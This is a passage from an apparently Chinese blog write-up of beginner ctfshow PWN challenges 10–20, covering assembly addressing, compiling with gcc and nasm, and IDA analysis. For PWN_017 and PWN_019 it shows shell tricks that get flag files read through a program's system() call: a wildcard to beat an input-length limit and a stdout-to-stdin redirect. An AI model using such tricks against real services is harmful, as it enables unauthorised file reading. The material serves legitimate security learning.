	srcset="/p/ctfshow-pwn-writeup/28_hu_e162f950e4f701a0.png 480w, /p/ctfshow-pwn-writeup/28_hu_fc64a86acf95c0c7.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="548"
		data-flex-basis="1316px"
	
></p>
<p>然后我们跟进看一下地址：</p>
<p><img src="/p/ctfshow-pwn-writeup/29.png"
	width="770"
	height="110"
	srcset="/p/ctfshow-pwn-writeup/29_hu_8e18458aaf2629b0.png 480w, /p/ctfshow-pwn-writeup/29_hu_265416ee1eefcac9.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="700"
		data-flex-basis="1680px"
	
></p>
<p>也就是这里将msg的地址（0x80490E8）+ 4 处所执向的地址的值赋给eax</p>
<p>4是十进制的，地址是16进制的，记得转换一下：</p>
<p>hex(0x80490E8+4)&ndash;&gt; 080490EC</p>
<p>对应地址得值是ome_to_CTFshow_PWN</p>
<p>故flag:ctfshow{ome_to_CTFshow_PWN}</p>
<h3 id="pwn_011">PWN_011
</h3><p>题目：<strong>基址变址寻址</strong>方式结束后的eax寄存器的值为？</p>
<p><a class="link" href="PWN_011%5cWelcome_to_CTFshow" >Welcome_to_CTFshow</a></p>
<p><a class="link" href="PWN_011%5cWelcome_to_CTFshow.asm" >Welcome_to_CTFshow.asm</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="c1">; 基址变址寻址方式</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; 将msg的地址赋值给ecx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">2</span>          <span class="c1">; 将2赋值给edx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span> <span class="o">+</span> <span class="nb">edx</span><span class="o">*</span><span class="mi">2</span><span class="p">]</span>  <span class="c1">; 将ecx+edx*2所指向的地址的值赋值给eax</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>同样的，放到IDA上找这个基址变址寻址方式：</p>
<p><img src="/p/ctfshow-pwn-writeup/30.png"
	width="780"
	height="60"
	srcset="/p/ctfshow-pwn-writeup/30_hu_901c17825a17f8ed.png 480w, /p/ctfshow-pwn-writeup/30_hu_668a6173f2e3ecb2.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="1300"
		data-flex-basis="3120px"
	
></p>
<p>双击点dword去跟进到地址：</p>
<p><img src="/p/ctfshow-pwn-writeup/31.png"
	width="820"
	height="135"
	srcset="/p/ctfshow-pwn-writeup/31_hu_15a7389171b58f28.png 480w, /p/ctfshow-pwn-writeup/31_hu_750b9884b38e7964.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="607"
		data-flex-basis="1457px"
	
></p>
<p>计算最终也是 [0x80490E8 + 2*2 ] = [0X80490EC]</p>
<p>其实也是和PWN_010一样：hex(0x80490E8+4)</p>
<p>就是说hex(0x80490E8 + 2*2 )=0X80490EC，对应的是“ome_to_CTFshow_PWN”。</p>
<p>flag：ctfshow{ome_to_CTFshow_PWN}</p>
<h3 id="pwn_012">PWN_012
</h3><p>题目：相对基址变址寻址方式结束后eax寄存器的值为？</p>
<p><a class="link" href="PWN_012%5cWelcome_to_CTFshow" >Welcome_to_CTFshow</a></p>
<p><a class="link" href="PWN_012%5cWelcome_to_CTFshow.asm" >Welcome_to_CTFshow.asm</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="c1">; 相对基址变址寻址方式</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; 将msg的地址赋值给ecx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">1</span>          <span class="c1">; 将1赋值给edx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">add</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">8</span>          <span class="c1">; 将ecx加上8</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span> <span class="o">+</span> <span class="nb">edx</span><span class="o">*</span><span class="mi">2</span> <span class="o">-</span> <span class="mi">6</span><span class="p">]</span>  <span class="c1">; 将ecx+edx*2-6所指向的地址的值赋值给eax</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn-writeup/32.png"
	width="770"
	height="164"
	srcset="/p/ctfshow-pwn-writeup/32_hu_99e9e101810244d0.png 480w, /p/ctfshow-pwn-writeup/32_hu_f807a9c980e1f370.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="469"
		data-flex-basis="1126px"
	
></p>
<p>跟进offset dword_80490E8：</p>
<p><img src="/p/ctfshow-pwn-writeup/33.png"
	width="856"
	height="105"
	srcset="/p/ctfshow-pwn-writeup/33_hu_3157e877f3a9f1c1.png 480w, /p/ctfshow-pwn-writeup/33_hu_77b09f0915eccfa5.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="815"
		data-flex-basis="1956px"
	
></p>
<p>那就是：[8 + 0x80490E8 + 1*2 - 6] = [0x80490EC]</p>
<p>故flag:ctfshow{ome_to_CTFshow_PWN}</p>
<h3 id="pwn_013">PWN_013
</h3><p>题目：如何使用GCC？编译运行后即可获得flag  <a class="link" href="PWN_013%5cPWN_013.c" >PWN_013.c</a></p>
<p>学过C语言都会安装配置编译器环境的，我这里使用的是<strong>visual-studio-code</strong>。</p>
<p><img src="/p/ctfshow-pwn-writeup/34.png"
	width="1534"
	height="466"
	srcset="/p/ctfshow-pwn-writeup/34_hu_a2d59cd0ef0b2014.png 480w, /p/ctfshow-pwn-writeup/34_hu_a654e108c81c213e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="329"
		data-flex-basis="790px"
	
></p>
<p>这段代码是一个简单的 C 程序，它使用字符数组 flag 存储了一个加密的字符串，并通过 printf函数将其打印出来。</p>
<p>在这段代码中， flag 数组存储了一串整数值，这些整数值代表了字符的 ASCII 码。通过将这些整数值转换为相应的字符，就可以还原出原始的字符串。</p>
<p>运行该程序， printf 函数使用 %s 格式字符串将 flag 数组作为参数进行打印。由于 flag 数组的最后一个元素为零（NULL 字符）， printf 函数会将其之前的字符依次打印，直到遇到 NULL 字符为止。根据给定的整数值数组，还原出的字符串为： ctfshow{hOw_t0_us3_GCC?} 。</p>
<h3 id="pwn_014">PWN_014
</h3><p>题目：请你阅读以下源码，<strong>给定key为”CTFshow”</strong>，编译运行即可获得flag。 <a class="link" href="PWN_014%5cPWN_014.c" >PWN_014.c</a></p>
<p>这个文件有强度了，直接编译运行会说nothing is here，不给flag，先读一下这个C语言文件在干什么的：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>                  <span class="c1">// 文件指针，用于操作文件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">];</span>  <span class="c1">// 缓冲区，存储从文件读取的二进制数据
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">size_t</span> <span class="n">n</span><span class="p">;</span>                  <span class="c1">// 记录每次实际读取的字节数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">fp</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;key&#34;</span><span class="p">,</span> <span class="s">&#34;rb&#34;</span><span class="p">);</span>   <span class="c1">// 以二进制只读方式打开名为 &#34;key&#34; 的文件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 检查文件是否成功打开
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;Nothing here!&#34;</span><span class="p">);</span>  <span class="c1">// 若打开失败，打印错误信息
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 输出缓冲区：大小为 BUFFER_SIZE*9 + 12（预留足够空间存储二进制字符串和分隔符）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">char</span> <span class="n">output</span><span class="p">[</span><span class="n">BUFFER_SIZE</span> <span class="o">*</span> <span class="mi">9</span> <span class="o">+</span> <span class="mi">12</span><span class="p">];</span> 
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  <span class="c1">// 记录 output 中当前已使用的位置（偏移量）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 先在 output 开头写入 &#34;ctfshow{&#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">offset</span> <span class="o">+=</span> <span class="nf">sprintf</span><span class="p">(</span><span class="n">output</span> <span class="o">+</span> <span class="n">offset</span><span class="p">,</span> <span class="s">&#34;ctfshow{&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 循环读取文件内容：每次最多读 BUFFER_SIZE 字节，直到文件结束
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">while</span> <span class="p">((</span><span class="n">n</span> <span class="o">=</span> <span class="nf">fread</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">),</span> <span class="n">BUFFER_SIZE</span><span class="p">,</span> <span class="n">fp</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 遍历本次读取的每个字节
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// 将当前字节拆分为 8 位二进制（从高位到低位）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">7</span><span class="p">;</span> <span class="n">j</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// (buffer[i] &gt;&gt; j) &amp; 1：获取第 j 位（0 或 1），并写入 output
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">offset</span> <span class="o">+=</span> <span class="nf">sprintf</span><span class="p">(</span><span class="n">output</span> <span class="o">+</span> <span class="n">offset</span><span class="p">,</span> <span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="n">j</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// 除了最后一个字节，每个字节的二进制后加下划线 &#34;_&#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">!=</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">offset</span> <span class="o">+=</span> <span class="nf">sprintf</span><span class="p">(</span><span class="n">output</span> <span class="o">+</span> <span class="n">offset</span><span class="p">,</span> <span class="s">&#34;_&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 若未到文件末尾，在本次缓冲区数据后加空格 &#34; &#34;（分隔不同批次的读取）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">feof</span><span class="p">(</span><span class="n">fp</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">offset</span> <span class="o">+=</span> <span class="nf">sprintf</span><span class="p">(</span><span class="n">output</span> <span class="o">+</span> <span class="n">offset</span><span class="p">,</span> <span class="s">&#34; &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 在 output 末尾写入 &#34;}&#34;，完成格式包裹
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">offset</span> <span class="o">+=</span> <span class="nf">sprintf</span><span class="p">(</span><span class="n">output</span> <span class="o">+</span> <span class="n">offset</span><span class="p">,</span> <span class="s">&#34;}&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 打印最终生成的字符串
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">output</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>  <span class="c1">// 关闭文件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>也就是说我们需要一个名为key的文件，让这个程序知道，然后他就能把flag字符串吐出来了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;CTFshow&#34;</span>&gt; key  <span class="c1">#创建一个名为key得文件，向内输入“CTFshow”的字符串</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn-writeup/35.png"
	width="1145"
	height="336"
	srcset="/p/ctfshow-pwn-writeup/35_hu_df60cb17ad88303e.png 480w, /p/ctfshow-pwn-writeup/35_hu_aca6ec48c69a455b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="340"
		data-flex-basis="817px"
	
></p>
<p>答案是ctfshow{01000011_01010100_01000110_01110011_01101000_01101111_01110111_00001010}</p>
<p>题目要求在key里加CTFshow字符串，加其它是错的，输出结果不同。</p>
<h3 id="pwn_015">PWN_015
</h3><p>题目：编译汇编代码到可执行文件，即可拿到flag。 <a class="link" href="PWN_015%5cflag.asm" >flag.asm</a></p>
<p>汇编转换：将 .asm 转换为目标文件（.obj 或 .o）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nasm -f elf flag.asm
</span></span></code></pre></td></tr></table>
</div>
</div><p>汇编生成可执行文件：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ld -m elf_i386 -s -o flag1 flag.o
</span></span></code></pre></td></tr></table>
</div>
</div><p>（flag1是可执行文件）</p>
<p><img src="/p/ctfshow-pwn-writeup/36.png"
	width="624"
	height="165"
	srcset="/p/ctfshow-pwn-writeup/36_hu_fda5333d80d87b82.png 480w, /p/ctfshow-pwn-writeup/36_hu_4d6103555c03c502.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="378"
		data-flex-basis="907px"
	
></p>
<p>比较简单，和<a class="link" href="https://expl0rer.top/p/ctfshow-pwn-writeup/#pwn_005"  target="_blank" rel="noopener"
    >PWN_005</a>很类似，都是汇编语言编译运行之类的。</p>
<p>ctfshow{@ss3mb1y_1s_3@sy}</p>
<h3 id="pwn_016">PWN_016
</h3><p>题目：使用gcc将其编译为可执行文件。 <a class="link" href="PWN_016%5cflag.s" >flag.s</a></p>
<p><img src="/p/ctfshow-pwn-writeup/37.png"
	width="646"
	height="104"
	srcset="/p/ctfshow-pwn-writeup/37_hu_b3e8aef3e1ef05a0.png 480w, /p/ctfshow-pwn-writeup/37_hu_af79549354799dd4.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="621"
		data-flex-basis="1490px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc flag.s -o flag
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以使用 gcc 命令直接编译汇编语言源文件（ .s 文件）并将其链接为可执行文件。 gcc 命令具有适用于多种语言的编译器驱动程序功能，它可以根据输入文件的扩展名自动选择适当的编译器和链接器。</p>
<p>故flag：ctfshow{daniuniuda}</p>
<h3 id="pwn_017">PWN_017
</h3><p>题目：有些命令好像有点不一样？不要一直等，可能那样永远也等不到flag。</p>
<p><img src="/p/ctfshow-pwn-writeup/38.png"
	width="930"
	height="325"
	srcset="/p/ctfshow-pwn-writeup/38_hu_7d79a6ffed12bd13.png 480w, /p/ctfshow-pwn-writeup/38_hu_bffb150ab5d0f0e3.png 1024w"
	loading="lazy"
	
		alt="进程3"
	
	
		class="gallery-image" 
		data-flex-grow="286"
		data-flex-basis="686px"
	
></p>
<p>比较奇葩的是，这里选择3的话，一直在loading的，可能是不通的，我换到主机的nc也不行，那就是选2进程的</p>
<p><img src="/p/ctfshow-pwn-writeup/39.png"
	width="879"
	height="536"
	srcset="/p/ctfshow-pwn-writeup/39_hu_feeea272629e1334.png 480w, /p/ctfshow-pwn-writeup/39_hu_cc955cd53b60ba21.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="163"
		data-flex-basis="393px"
	
></p>
<p>选了2后，程序开始发癫了&hellip;.，一直循环搞得我Kali虚拟机卡死了，进到IDAx64去看：</p>
<p><img src="/p/ctfshow-pwn-writeup/40.png"
	width="1160"
	height="423"
	srcset="/p/ctfshow-pwn-writeup/40_hu_4ec1173fad870b57.png 480w, /p/ctfshow-pwn-writeup/40_hu_9873e66f0cb6080d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="274"
		data-flex-basis="658px"
	
></p>
<p>这个case2的read函数只读取10字节以内的，也就是说ctfshow_flag（12byte）这串是超字节限制了。不过之前学了那个指令有通配符的cat ctf*（因为当你选择”ls ./“，打开全部文件后，发现只有一个ctfshow_flag时由ctf字眼的，那我们正好可以绕过超字节的限制了）</p>
<p>搜索打开由ctf这串字符的文件内容：</p>
<p><img src="/p/ctfshow-pwn-writeup/41.png"
	width="691"
	height="231"
	srcset="/p/ctfshow-pwn-writeup/41_hu_fc1a2ff65540e4c9.png 480w, /p/ctfshow-pwn-writeup/41_hu_6ea90f86dc5d2b36.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="299"
		data-flex-basis="717px"
	
></p>
<h3 id="pwn_018">PWN_018
</h3><p>题目：仔细看看源码，或许有惊喜；假作真时真亦假，真作假时假亦真。 <a class="link" href="PWN_018" >PWN_018</a></p>
<p>连接nc后一上来就问：</p>
<p><img src="/p/ctfshow-pwn-writeup/42.png"
	width="754"
	height="275"
	srcset="/p/ctfshow-pwn-writeup/42_hu_b8edf74f377f50dc.png 480w, /p/ctfshow-pwn-writeup/42_hu_48a1d4051a0ee6e8.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="274"
		data-flex-basis="658px"
	
></p>
<p>这我哪知道啊？去看IDAx64：</p>
<p><img src="/p/ctfshow-pwn-writeup/43.png"
	width="736"
	height="230"
	srcset="/p/ctfshow-pwn-writeup/43_hu_a7c9b35aa1d7b9e4.png 480w, /p/ctfshow-pwn-writeup/43_hu_566fc56e89492c97.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="320"
		data-flex-basis="768px"
	
></p>
<p><img src="/p/ctfshow-pwn-writeup/44.png"
	width="905"
	height="370"
	srcset="/p/ctfshow-pwn-writeup/44_hu_c4fb8fcadd3dd78e.png 480w, /p/ctfshow-pwn-writeup/44_hu_1ce437554407a80a.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="244"
		data-flex-basis="587px"
	
></p>
<p>分别跟进一下real和fake：</p>
<p><img src="/p/ctfshow-pwn-writeup/46.png"
	width="689"
	height="156"
	srcset="/p/ctfshow-pwn-writeup/46_hu_4f7764fbe823e672.png 480w, /p/ctfshow-pwn-writeup/46_hu_faedb59ceeafafd5.png 1024w"
	loading="lazy"
	
		alt="fake"
	
	
		class="gallery-image" 
		data-flex-grow="441"
		data-flex-basis="1060px"
	
></p>
<p><img src="/p/ctfshow-pwn-writeup/47.png"
	width="711"
	height="189"
	srcset="/p/ctfshow-pwn-writeup/47_hu_c473fd1e4140dc1a.png 480w, /p/ctfshow-pwn-writeup/47_hu_f4c64f3e30a094f4.png 1024w"
	loading="lazy"
	
		alt="real"
	
	
		class="gallery-image" 
		data-flex-grow="376"
		data-flex-basis="902px"
	
></p>
<p>解读一下发现一个机制：当v4不等于9时就会执行real函数，这时real会执行<code>echo 'flag is here'&gt;/ctfshow_flag</code>，这个命令将字符串 &lsquo;flag is here&rsquo; 覆盖写入 /ctfshow_flag 文件中。 &gt; 符号表示以覆盖的方式写入文件，如果文件不存在则创建新文件。如果 /ctfshow_flag 文件已经存在，那么该命令会将文件中原有的内容替换为 &lsquo;flag is here&rsquo; 。也就是说你第一次和靶机交互时没输入9，你以后都不得不到flag了，只能重开靶机&hellip;..比较CS吧&hellip;</p>
<p><code>echo 'flag is here'&gt;&gt;/ctfshow_flag</code>这个命令将字符串 &lsquo;flag is here&rsquo; <em><strong>追加</strong></em>写入 /ctfshow_flag 文件中。 &raquo; 符号表示以追加的方式写入文件，如果文件不存在则创建新文件。如果 /ctfshow_flag 文件已经存在，那么该命令会在文件的末尾添加 &lsquo;flag is here&rsquo; 。</p>
<p>这两个命令都用于将 &lsquo;flag is here&rsquo; 写入 /ctfshow_flag 文件中，不同之处在于写入方式的不同。第一个命令使用追加方式，在文件末尾添加内容；第二个命令使用覆盖方式，将文件内容替换为新内容。具体使用哪个命令取决于需求和文件操作的预期结果。也就是所假的其实是我们需要的真的，真的反而是假的在远程环境中，我们需要在第一次读到flag，否则后续得到的flag都已经被覆写再追加，真实的flag内容已经没了。</p>
<p><img src="/p/ctfshow-pwn-writeup/45.png"
	width="751"
	height="315"
	srcset="/p/ctfshow-pwn-writeup/45_hu_5e1d20db51249b2d.png 480w, /p/ctfshow-pwn-writeup/45_hu_acaf9b3fd36a04e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="238"
		data-flex-basis="572px"
	
></p>
<h3 id="pwn_019">PWN_019
</h3><p>题目：关闭了输出流，一定是最安全的吗？ <a class="link" href="PWN_019" >PWN_019</a></p>
<p><img src="/p/ctfshow-pwn-writeup/48.png"
	width="1315"
	height="636"
	srcset="/p/ctfshow-pwn-writeup/48_hu_2e667aaa82bc0e4f.png 480w, /p/ctfshow-pwn-writeup/48_hu_d60e1adae16a1f50.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="206"
		data-flex-basis="496px"
	
></p>
<p>在IDA上看到，是由read和system函数的，按道理我直接cat /ctf*应该就出flag了啊&hellip;</p>
<p>问题就出在这个fclose函数（确实没辙了，只能用AI解释一下了）作用是关闭文件输出流，标准输出被关闭了（无法显示）。</p>
<p>那还有<strong>输入流</strong>啊，可以用重定向：<strong><code>1&gt;&amp;0</code></strong></p>
<p>这是 Linux 的 I/O 重定向语法：</p>
<ul>
<li><code>1</code> 代表<strong>标准输出（stdout）</strong>（正常情况下，命令的输出会送到这里，显示在终端）；</li>
<li><code>0</code> 代表<strong>标准输入（stdin）</strong>（正常情况下，用户输入从这里读取，通常指向终端）；</li>
<li><code>1&gt;&amp;0</code> 表示：<strong>将标准输出重定向到标准输入所指向的位置</strong>。</li>
</ul>
<p>因为代码中标准输出被关闭了（无法显示），但标准输入（通常是终端）仍然可用，所以通过这个重定向，<code>cat</code> 命令的输出会被 “转移” 到标准输入对应的终端，从而让内容能显示出来。</p>
<p>简单说就是：正常显示内容的 “输出通道” 被关了，但接收输入的 “输入通道” 还能用。通过 1&gt;&amp;0 把原本该从 “输出通道” 显示的内容，转到 “输入通道” 对应的终端上，这样就能看到 flag 了。ctfshow{a390a91b-5203-46ae-812d-0396de95184f}</p>
<p>本质上是利用了 “输入通道和终端还连着” 这个漏洞，让内容 “借道” 显示出来～。</p>
<p><img src="/p/ctfshow-pwn-writeup/49.png"
	width="1030"
	height="550"
	srcset="/p/ctfshow-pwn-writeup/49_hu_9e7f3c9c7cb0a617.png 480w, /p/ctfshow-pwn-writeup/49_hu_2a293b314017f370.png 1024w"
	loading="lazy"
	
		alt="重定向"
	
	
		class="gallery-image" 
		data-flex-grow="187"
		data-flex-basis="449px"
	
></p>
<h3 id="pwn_020">PWN_020
</h3><p>题目：提交ctfshow{【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】}</p>
<p>例如 .got可写.got.plt表可写其地址为0x400820 0x8208820</p>
<p>最终flag为ctfshow{1_1_0x400820_0x8208820}</p>
<p>若某个表不存在，则无需写其对应地址</p>
<p>如不存在.got.plt表，则最终flag值为ctfshow{1_0_0x400820}</p>
<p><a class="link" href="PWN_020" >PWN_020</a></p>
<hr>
<p>checksec一下：</p>
<p><img src="/p/ctfshow-pwn-writeup/50.png"
	width="600"
	height="155"
	srcset="/p/ctfshow-pwn-writeup/50_hu_5395d84a6ce1faca.png 480w, /p/ctfshow-pwn-writeup/50_hu_d78e65288b53f8ce.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="387"
		data-flex-basis="929px"
	
></p>
<p>在这里只开了NX保护。</p>
<p><img src="/p/ctfshow-pwn-writeup/51.png"
	width="755"
	height="264"
